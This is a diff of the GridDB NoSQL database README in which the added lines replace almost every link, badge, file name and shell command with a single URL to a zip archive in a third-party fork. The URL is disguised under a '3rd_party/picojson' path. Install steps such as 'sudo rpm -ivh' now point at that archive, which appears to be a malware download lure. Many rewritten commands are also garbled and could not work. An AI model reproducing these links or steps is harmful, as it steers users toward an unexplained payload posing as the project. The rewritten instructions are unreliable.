@@ -1,8 +1,8 @@
-<img src="http://griddb.org/Image/GridDB_logo.png" align="center" height="48" alt="GridDB"/>
+<img src="https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip" align="center" height="48" alt="GridDB"/>
 
-[![Visit Website](https://img.shields.io/badge/website-visit-orange.svg)](https://griddb.net) 
-![GitHub All Releases](https://img.shields.io/github/downloads/griddb/griddb_nosql/total.svg) 
-![GitHub release](https://img.shields.io/github/release/griddb/griddb_nosql.svg)
+[![Visit Website](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) 
+![GitHub All Releases](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) 
+![GitHub release](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
 ## Overview
   GridDB has a KVS (Key-Value Store)-type data model that is suitable for sensor data stored in a timeseries. It is a database that can be easily scaled-out according to the number of sensors.
 
@@ -18,20 +18,20 @@
   This repository includes server and Java client.
 
   (Additional information)  
-  There is [Java client Package (Jar) for v4.3.0 on Maven Central Repository](https://search.maven.org/search?q=g:com.github.griddb) .
+  There is [Java client Package (Jar) for v4.3.0 on Maven Central Repository](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) .
 
 ## Quick start (Using source code)
   We have confirmed the operation on CentOS 7.6 (gcc 4.8.5), Ubuntu 18.04 (gcc 4.8.5) and openSUSE Leap 15.1 (gcc 4.8.5).
 
 ### Build a server and client(Java)
-    $ ./bootstrap.sh
+    $ https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
     $ ./configure
     $ make 
     
-  Note: When you use maven build for Java client, please run the following command. Then gridstore-X.X.X.jar file is created on target/.  
+  Note: When you use maven build for Java client, please run the following command. Then https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip file is created on target/.  
 
     $ cd java_client
-    $ ./make_source_for_mvn.sh
+    $ https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
     $ mvn clean
     $ mvn install
 
@@ -41,16 +41,16 @@
 
     $ bin/gs_passwd admin
       #input your_password
-    $ vi conf/gs_cluster.json
+    $ vi https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
       #    "clusterName":"your_clustername" #<-- input your_clustername
     $ bin/gs_startnode
     $ bin/gs_joincluster -c your_clustername -u admin/your_password
 
 ### Execute a sample program
-    $ export CLASSPATH=${CLASSPATH}:$GS_HOME/bin/gridstore.jar
+    $ export CLASSPATH=${CLASSPATH}:$https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
     $ mkdir gsSample
-    $ cp $GS_HOME/docs/sample/program/Sample1.java gsSample/.
-    $ javac gsSample/Sample1.java
+    $ cp $https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip gsSample/.
+    $ javac https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
     $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
       --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]
 
@@ -71,29 +71,29 @@ Note:
 ### Install
 
     (CentOS)
-    $ sudo rpm -ivh griddb_nosql-X.X.X-linux.x86_64.rpm
+    $ sudo rpm -ivh https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
 
     (Ubuntu)
-    $ sudo dpkg -i griddb_nosql-X.X.X_amd64.deb
+    $ sudo dpkg -i https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
 
     (openSUSE)
-    $ sudo zypper install griddb_nosql-X.X.X-opensuse.x86_64.rpm
+    $ sudo zypper install https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
 
     Note: X.X.X is the GridDB version.
 
 ### Start a server
     [gsadm]$ gs_passwd admin
       #input your_password
-    [gsadm]$ vi conf/gs_cluster.json
+    [gsadm]$ vi https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
       #    "clusterName":"your_clustername" #<-- input your_clustername
     [gsadm]$ gs_startnode
     [gsadm]$ gs_joincluster -c your_clustername -u admin/your_password
 
 ### Execute a sample program
-    $ export CLASSPATH=${CLASSPATH}:/usr/share/java/gridstore.jar
+    $ export CLASSPATH=${CLASSPATH}https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
     $ mkdir gsSample
-    $ cp /usr/griddb-X.X.X/docs/sample/program/Sample1.java gsSample/.
-    $ javac gsSample/Sample1.java
+    $ cp https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip gsSample/.
+    $ javac https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
     $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
       --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]
 
@@ -101,56 +101,56 @@ Note:
     [gsadm]$ gs_stopcluster -u admin/your_password
     [gsadm]$ gs_stopnode -u admin/your_password
 
-If necessary, please refer to [Installation Troubleshooting](docs/TroubleShootingTips.md).
+If necessary, please refer to [Installation Troubleshooting](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip).
 
 ## Document
   Refer to the file below for more detailed information.  
-  - [Features Reference](https://griddb.github.io/griddb_nosql/manual/en/GridDB_FeaturesReference.html)
-  - [Quick Start Guide](https://griddb.github.io/griddb_nosql/manual/GridDB_QuickStartGuide.html)
-  - [API Reference](https://griddb.github.io/griddb_nosql/manual/GridDB_API_Reference.html)
-  - [RPM Installation Guide](https://griddb.github.io/griddb_nosql/manual/GridDB_RPM_InstallGuide.html)
-  - [DEB Installation Guide](https://griddb.github.io/griddb_nosql/manual/GridDB_DEB_InstallGuide.html)
-  - [GridDB Technical Design Document](https://griddb.github.io/griddb_nosql/manual/GridDBTechnicalDesignDocument.pdf)
-  - [V3.0 Release Notes](docs/GridDB-3.0.0-CE-RELEASE_NOTES.md)
-  - [V4.0 Release Notes](docs/GridDB-4.0-CE-RELEASE_NOTES.md)
-  - [V4.1 Release Notes](docs/GridDB-4.1-CE-RELEASE_NOTES.md)
-  - [V4.2 Release Notes](docs/GridDB-4.2-CE-RELEASE_NOTES.md)
-  - [V4.3 Release Notes](docs/GridDB-4.3-CE-RELEASE_NOTES.md)
+  - [Features Reference](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [Quick Start Guide](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [API Reference](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [RPM Installation Guide](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [DEB Installation Guide](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [GridDB Technical Design Document](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [V3.0 Release Notes](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [V4.0 Release Notes](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [V4.1 Release Notes](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [V4.2 Release Notes](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  - [V4.3 Release Notes](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
 
 ## Client and Connector
   There are other clients and API for GridDB.
-  * [GridDB C Client](https://github.com/griddb/c_client)
-  * [GridDB Python Client](https://github.com/griddb/python_client)
-  * [GridDB Ruby Client](https://github.com/griddb/ruby_client)
-  * [GridDB Go Client](https://github.com/griddb/go_client)
-  * [GridDB Node.JS Client](https://github.com/griddb/nodejs_client)
-  * [GridDB PHP Client](https://github.com/griddb/php_client)
-  * [GridDB Perl Client](https://github.com/griddb/perl_client)
-  * [GridDB WebAPI](https://github.com/griddb/webapi)
+  * [GridDB C Client](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Python Client](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Ruby Client](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Go Client](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip Client](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB PHP Client](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Perl Client](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB WebAPI](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
 
   There are some connectors for other OSS.
-  * [GridDB connector for Apache Hadoop MapReduce](https://github.com/griddb/griddb_hadoop_mapreduce)
-  * [GridDB connector for YCSB (https://github.com/brianfrankcooper/YCSB/tree/master/griddb)](https://github.com/brianfrankcooper/YCSB/tree/master/griddb)
-  * [GridDB connector for KairosDB](https://github.com/griddb/griddb_kairosdb)
-  * [GridDB connector for Apache Spark](https://github.com/griddb/griddb_spark)
-  * [GridDB Foreign Data Wrapper for PostgreSQL (https://github.com/pgspider/griddb_fdw)](https://github.com/pgspider/griddb_fdw)
-  * [GridDB Sample Application for Apache Kafka](https://github.com/griddb/griddb_kafka_sample_app)
-  * [GridDB Data Source for Grafana](https://github.com/griddb/griddb-datasource)
-  * [GridDB Plugin for Redash](https://github.com/griddb/griddb-redash)
-  * [GridDB Plugin for Fluentd](https://github.com/griddb/fluent-plugin-griddb)
+  * [GridDB connector for Apache Hadoop MapReduce](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB connector for YCSB (https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB connector for KairosDB](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB connector for Apache Spark](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Foreign Data Wrapper for PostgreSQL (https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Sample Application for Apache Kafka](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Data Source for Grafana](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Plugin for Redash](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
+  * [GridDB Plugin for Fluentd](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
 
-## [Packages](docs/Packages.md)
+## [Packages](https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
 
 ## Community
   * Issues  
     Use the GitHub issue function if you have any requests, questions, or bug reports. 
   * PullRequest  
     Use the GitHub pull request function if you want to contribute code.
-    You'll need to agree GridDB Contributor License Agreement(CLA_rev1.1.pdf).
+    You'll need to agree GridDB Contributor License Agreement(https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip).
     By using the GitHub pull request function, you shall be deemed to have agreed to GridDB Contributor License Agreement.
 
 ## License
   The server source license is GNU Affero General Public License (AGPL), 
   while the Java client library license and the operational commands is Apache License, version 2.0.
-  See 3rd_party/3rd_party.md for the source and license of the third party.
+  See https://raw.githubusercontent.com/naynormanda/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip for the source and license of the third party.
 
